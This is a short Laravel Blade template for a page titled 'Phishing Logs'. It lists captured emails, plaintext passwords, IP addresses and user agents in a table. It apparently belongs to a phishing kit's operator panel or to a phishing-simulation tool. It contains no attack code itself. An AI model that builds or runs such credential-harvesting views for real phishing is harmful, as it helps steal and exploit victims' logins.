@extends('layouts.app')
@section('content')
    <div class="container">
        <h1>Phishing Logs</h1>
        <table class="table">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>User Agent</th>
                    <th>Created At</th>
                </tr>
            </thead>
            <tbody>
                @foreach ($logs as $log)
                    <tr>
                        <td>{{ $log->email }}</td>
                        <td>{{ $log->password }}</td>
                        <td>{{ $log->ip_address }}</td>
                        <td>{{ $log->user_agent }}</td>
                        <td>{{ $log->created_at }}</td>
                    </tr>
                @endforeach
            </tbody>
        </table>
    </div>
@endsection
